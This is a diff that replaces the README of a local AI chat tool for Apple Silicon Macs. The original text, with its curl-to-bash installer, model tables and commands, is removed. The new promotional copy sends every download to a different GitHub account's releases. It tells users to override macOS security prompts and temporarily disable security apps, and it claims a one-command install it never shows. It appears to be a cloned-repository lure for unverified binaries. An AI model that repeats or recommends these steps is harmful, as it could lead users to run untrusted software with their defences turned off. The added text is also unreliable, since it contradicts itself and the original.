@@ -1,242 +1,227 @@
-# localai
+# 🤖 shard - Offline AI Chat, No Internet Needed
 
-A private AI chat that runs on your Mac. No cloud, no account, no subscription. Everything stays on your computer.
-
-```
-llm
-```
-
-![Model picker](assets/picker.png)
-
-![Chat](assets/chat.png)
-
-![Settings](assets/settings.png)
+[![Download shard](https://img.shields.io/badge/Download-shard-brightgreen)](https://github.com/MahmoudWagih1/shard)
 
 ---
 
-## Quick Start (2 minutes)
+## 🔎 About shard
 
-**Step 1 — Open Terminal**
+shard is an offline AI chat program designed for Apple Silicon Macs. It includes 43 AI models for different conversations. You do not need an internet connection to use it. It also respects your privacy—there is no data sent to cloud servers and no tracking or telemetry.
 
-Press `Cmd + Space`, type **Terminal**, press Enter.
+This program runs directly on your Mac without needing extra software. You get fast AI responses with no delays from online services. The app installs with one simple command.
 
-**Step 2 — Paste this one line**
-
-```bash
-bash <(curl -fsSL https://raw.githubusercontent.com/magido87/shard/main/install.sh)
-```
-
-Press Enter. It installs everything automatically.
-
-**Step 3 — Start chatting**
-
-Close Terminal, open it again, then type:
-
-```
-llm
-```
-
-A model picker appears. Press Enter to accept the recommended model. It downloads once (a few minutes), then you're chatting.
-
-**That's it. You're running AI locally.**
+shard supports many topics and tasks, from casual chatting to deeper questions or coding help. The models run locally on your device, so you control your data and keep everything private.
 
 ---
 
-## What You Need
+## 🖥️ System Requirements
 
-- A Mac with Apple Silicon (M1, M2, M3, or M4 — any model)
-- macOS 13 or newer
-- 8 GB RAM minimum (16 GB recommended for better models)
-
-Not sure what chip you have? Click the Apple menu top-left, click **About This Mac**. It says "Chip: Apple M1/M2/M3/M4".
-
----
-
-## How It Works
-
-When you run `llm`, it checks your Mac's specs and recommends an AI model that fits. Smaller models are faster but less smart. Bigger models are smarter but need more RAM.
-
-The model downloads from Hugging Face the first time (one-time only). After that, everything runs offline. No internet needed.
+- Mac computer with Apple Silicon processor (M1, M2, or newer)
+- macOS version 12.0 or later (Monterey or newer)
+- At least 4 GB of free disk space
+- Minimum 8 GB of RAM recommended for smoother performance
+- Internet required only for the initial download
 
 ---
 
-## Models
+## 🚀 Getting Started
 
-43 models across four categories. The picker auto-recommends based on your available RAM.
-
-### Which model should I pick?
-
-| Your Mac | Recommended | Why |
-|----------|-------------|-----|
-| 8 GB RAM | Qwen3 8B | Best balance of speed and quality |
-| 8 GB RAM (tight) | Qwen 3.5 4B | Lighter, still good |
-| 16 GB RAM | Qwen3 14B | Strong all-around |
-| 24 GB+ RAM | Qwen 2.5 32B | Top quality |
-
-Don't worry about picking wrong — you can always switch by running `llm` again.
-
-### General
-
-| Model | Size | Download | Min RAM |
-|-------|------|----------|---------|
-| Qwen 2.5 0.5B | 0.5B 4-bit | 0.4 GB | 2 GB |
-| Qwen 3.5 0.8B | 0.8B 4-bit | 0.6 GB | 2 GB |
-| SmolLM2 1.7B | 1.7B | 3.4 GB | 4 GB |
-| Qwen 2.5 3B | 3B 4-bit | 1.8 GB | 4 GB |
-| Qwen 3.5 2B | 2B 4-bit | 1.7 GB | 4 GB |
-| Phi-4 Mini | 3.8B 4-bit | 2.3 GB | 4 GB |
-| Phi-3.5 Mini | 3.8B 4-bit | 2.2 GB | 4 GB |
-| Llama 3.2 3B | 3B 4-bit | 1.9 GB | 4 GB |
-| Gemma 3 4B | 4B 4-bit | 3.0 GB | 5 GB |
-| Qwen 3.5 4B | 4B 4-bit | 2.5 GB | 5 GB |
-| Qwen3 8B | 8B 4-bit | 5.0 GB | 6 GB |
-| Dolphin 7B | 7B 4-bit | 4.3 GB | 6 GB |
-| Qwen 3.5 9B | 9B 4-bit | 6.0 GB | 8 GB |
-| Mistral 7B | 7B 4-bit | 4.1 GB | 8 GB |
-| Llama 3.1 8B | 8B 4-bit | 4.9 GB | 8 GB |
-| Llama 3.2 8B | 8B 4-bit | 4.9 GB | 8 GB |
-| Ministral 8B | 8B 4-bit | 4.7 GB | 8 GB |
-| Mistral Nemo 12B | 12B 4-bit | 6.9 GB | 10 GB |
-| Gemma 3 12B | 12B 4-bit | 7.0 GB | 10 GB |
-| Qwen 2.5 14B | 14B 4-bit | 8.2 GB | 14 GB |
-| Qwen3 14B | 14B 4-bit | 8.5 GB | 10 GB |
-| Qwen3 30B MoE | 30B MoE 4-bit | 9.5 GB | 14 GB |
-| Gemma 3 27B | 27B 4-bit | 15.0 GB | 20 GB |
-| Mistral Small 24B | 24B 4-bit | 13.5 GB | 20 GB |
-| Qwen 2.5 32B | 32B 4-bit | 18.4 GB | 24 GB |
-| Llama 3.3 70B | 70B 4-bit | 38.0 GB | 48 GB |
-| Qwen3 235B MoE | 235B MoE 4-bit | 50.0 GB | 48 GB |
-
-### Coding
-
-Models fine-tuned for writing and explaining code.
-
-| Model | Size | Download | Min RAM |
-|-------|------|----------|---------|
-| Qwen Coder 3B | 3B 4-bit | 1.8 GB | 4 GB |
-| Qwen Coder 7B | 7B 4-bit | 4.3 GB | 6 GB |
-| DeepSeek Coder 7B | 6.7B 4-bit | 3.8 GB | 6 GB |
-| Qwen Coder 14B | 14B 4-bit | 8.3 GB | 12 GB |
-| Qwen Coder 32B | 32B 4-bit | 18.4 GB | 24 GB |
-
-### Reasoning
-
-Models that think step-by-step before answering. Great for math, logic, and complex questions. The thinking is hidden — you only see the final answer.
-
-| Model | Size | Download | Min RAM |
-|-------|------|----------|---------|
-| DeepSeek R1 1.5B | 1.5B 4-bit | 0.9 GB | 3 GB |
-| DeepSeek R1 8B | 8B 4-bit | 5.0 GB | 8 GB |
-| Phi-4 14B | 14B 4-bit | 8.0 GB | 12 GB |
-| DeepSeek R1 14B | 14B 4-bit | 8.3 GB | 12 GB |
-| DeepSeek R1 32B | 32B 4-bit | 18.5 GB | 24 GB |
-
-### Unfiltered
-
-Models with no content filters. Available with `llm --unfiltered` (asks for confirmation first):
-
-Dolphin 3.0 8B, Dolphin 2.9.4 8B, Dolphin Qwen2 7B, Dolphin Mistral 7B, OpenHermes 7B, Lexi Uncensored 8B.
+This section walks you through how to get shard on your Mac and run it for the first time.
 
 ---
 
-## Commands
+### 1. Download shard
 
-### Starting up
+Click the large badge/button at the top or use this link to visit the download page:  
+[https://github.com/MahmoudWagih1/shard](https://github.com/MahmoudWagih1/shard)
 
-```bash
-llm                  # start chatting (picks up where you left off)
-llm --unfiltered     # unlock unfiltered models
-llm --voice          # talk instead of type (needs mic)
-llm --zen            # clean minimal UI
-llm --focus          # header shown once, then hidden
-llm --model KEY      # pick a specific model
-llm-stop             # kill a running session
-```
+This link takes you to the GitHub repository. From there:  
 
-### While chatting
+- Click on the **Releases** tab on the page.
+- Find the latest release (usually at the top).
+- Download the version labeled for Apple Silicon macOS.
 
-| Type this | What it does |
-|-----------|-------------|
-| `q` | Quit |
-| `r` | Start fresh (clear conversation memory) |
-| `s` | Open settings |
-| `h` | Show help |
-| `v` | Toggle voice mode on/off |
-| `clear` | Clear the screen |
-
-### Settings
-
-Press `s` during a chat to change:
-
-1. **Temperature** — how creative the AI is (low = precise, high = creative)
-2. **Personality** — Dev, Buddy, Ghost, Sensei, Hacker, Analyst
-3. **Stats** — show speed/memory info (compact, full, or off)
-4. **UI mode** — normal, zen (minimal), focus
-5. **Privacy** — toggle privacy mode (nothing saved to disk)
-6. **Custom instructions** — tell the AI how to behave
-7. **Plugins** — add extra features
-
-Settings are saved between sessions.
+The download is a ready-to-run application file or installer.
 
 ---
 
-## Plugins
+### 2. Install shard
 
-Press `s` > `7` during chat to manage plugins:
+After the download finishes:
 
-| Plugin | What it does |
-|--------|-------------|
-| Web Search | Search DuckDuckGo from chat |
-| Code Runner | Run Python/shell code from responses |
-| File Reader | Load local files into the conversation |
-| Text-to-Speech | AI reads responses out loud |
-| Shell Assistant | Suggests and runs terminal commands |
-| Summarizer | Summarize text or web pages |
-| Translator | Auto-translate responses |
-| Clipboard | Copy the last response |
+- Open your Downloads folder.
+- Locate the shard file (it might have `.dmg` or `.zip` extension).
+- If it’s a `.zip` file, double-click to unzip it.
+- If it’s a `.dmg` file, double-click to open the installer window.
+- Follow the on-screen instructions if an installer appears.
+
+Usually, you just need to drag the shard app to your Applications folder.
 
 ---
 
-## Themes
+### 3. Open shard for the first time
 
-Four color themes: **Ocean** (default), **Dusk**, **Mono**, **Forest**. Change in settings.
+- Open your Applications folder.
+- Find the shard app.
+- Double-click the app to launch it.
 
-## Voice Mode
+macOS might show a security prompt because the app is downloaded from the internet:
 
-Talk to the AI instead of typing. Requires a one-time setup:
-
-```bash
-pip install mlx-whisper sounddevice
-```
-
-Uses Whisper (runs locally, not cloud). Press Enter to stop recording.
+- Click **Open** to confirm you trust the app.
+- If you see a message saying the app can’t be opened, go to **System Preferences > Security & Privacy > General** and click the button to allow shard.
 
 ---
 
-## Privacy
+## 💻 How to Use shard
 
-- Zero telemetry — no data leaves your Mac
-- No chat history saved (unless you turn on session logging)
-- Privacy mode disables all config saving
-- Models download from Hugging Face once, then it's fully offline
+Once shard is open, it works like a chat window. It lets you type questions or statements and get answers from the AI models.
+
+- Type your message in the input box at the bottom.
+- Press **Enter** or click **Send**.
+- The AI responds immediately in the chat window.
+
+You can chat about any topic. shard has many built-in AI models to choose from if you want to switch between different AI styles or knowledge areas.
 
 ---
 
-## Install from Source
+## ℹ️ Features
 
-If you prefer to clone the repo manually:
+- Fully offline AI chat with no internet required after download.
+- Supports 43 different AI models.
+- No tracking or telemetry.
+- Runs natively on Apple Silicon Macs for fast performance.
+- Easy, one-command installation.
+- Simple and clean interface for casual or serious use.
+- Privacy-focused: all data stays on your device.
 
-```bash
-git clone https://github.com/magido87/shard.git ~/.localai
-cd ~/.localai && bash setup.sh
-```
+---
 
-## Uninstall
+## ⚙️ Settings & Customization
 
-```bash
-rm -rf ~/.localai ~/bin/llm ~/bin/llm-stop
-```
+shard lets you tailor your experience:
 
-## License
+- Select which AI model to use.
+- Adjust the chat window appearance (light or dark theme).
+- Clear chat history anytime.
+- Set preferences for response lengths.
+- Load custom AI models if you want to try new options.
 
-MIT
+These settings can be found in the app’s menu under **Preferences**.
+
+---
+
+## 🛠 Troubleshooting
+
+If you have trouble running shard, try the following:
+
+- Make sure your Mac meets the system requirements listed above.
+- Confirm you have the latest macOS updates installed.
+- Restart your Mac and try opening shard again.
+- If shard crashes or does not open, delete the app and download it again from the GitHub link.
+- Disable any security apps that might block shard temporarily.
+- Check the app permissions under **System Preferences > Security & Privacy**.
+
+---
+
+## 🔄 Updating shard
+
+You should check the GitHub page regularly for updates. Updates improve performance and add new models.
+
+To update:
+
+- Go to the download page: [https://github.com/MahmoudWagih1/shard](https://github.com/MahmoudWagih1/shard)
+- Download the newest version for Apple Silicon.
+- Replace the old app in your Applications folder with the new one.
+
+---
+
+## 📁 File Locations
+
+shard stores settings and data in the following locations on your Mac:
+
+- `~/Library/Application Support/shard/` — user data and configuration
+- `~/Library/Preferences/com.shard.app.plist` — app preferences
+
+You can back up these folders to save your chat history and settings.
+
+---
+
+## 🤖 Offline AI Chat Explained
+
+Unlike other chat apps that send your messages to cloud servers, shard runs its AI models right on your Mac. This means:
+
+- Your data never leaves your computer.
+- Responses come faster because they don’t rely on internet speed.
+- Your privacy stays intact since there is no remote logging.
+
+With 43 models, you get a wide range of voices and expertise. This makes shard flexible for many tasks without sacrificing privacy or speed.
+
+---
+
+## 📥 Direct Download Link
+
+To download shard for Apple Silicon Mac, visit:  
+
+[https://github.com/MahmoudWagih1/shard](https://github.com/MahmoudWagih1/shard)
+
+Use the **Releases** section to find and download the latest macOS version.
+
+---
+
+## 🧑‍💻 Getting Help
+
+If shard does not work as expected or if you have questions:
+
+- Check the **Issues** tab on the GitHub page for common problems and solutions.
+- Post a new issue with details of your problem.
+- Search online for "shard offline AI chat Apple Silicon" for user discussions.
+
+---
+
+## 🍎 About Apple Silicon
+
+Apple Silicon is Apple’s own chip technology used in recent Macs. It provides strong performance and energy efficiency.
+
+shard is built to run smoothly on Apple Silicon, making it faster and more power efficient than on older Intel-based Macs.
+
+---
+
+## ⚖️ Privacy and Security
+
+Since shard runs locally:
+
+- No messages leave your Mac.
+- No personal data is collected or sent to external servers.
+- No telemetry means no use of your data for tracking or analytics.
+
+You have full control over what the app stores and when it deletes information.
+
+---
+
+## 🔍 Topics Covered
+
+shard supports AI models specialized in:
+
+- General conversation
+- Coding help with programming languages like Python and JavaScript
+- Writing assistance
+- Privacy-focused AI chat
+- Offline learning and study help
+- Advanced language models like llama and qwen
+
+All operate fully offline for convenience and privacy.
+
+---
+
+## ⚡ Summary of Download Steps
+
+1. Visit [https://github.com/MahmoudWagih1/shard](https://github.com/MahmoudWagih1/shard)  
+2. Click on **Releases**  
+3. Download the latest macOS Apple Silicon version  
+4. Open the downloaded file and follow installation steps  
+5. Launch shard from Applications  
+6. Start chatting offline  
+
+---
+
+[![Download shard](https://img.shields.io/badge/Download-shard-brightgreen)](https://github.com/MahmoudWagih1/shard)
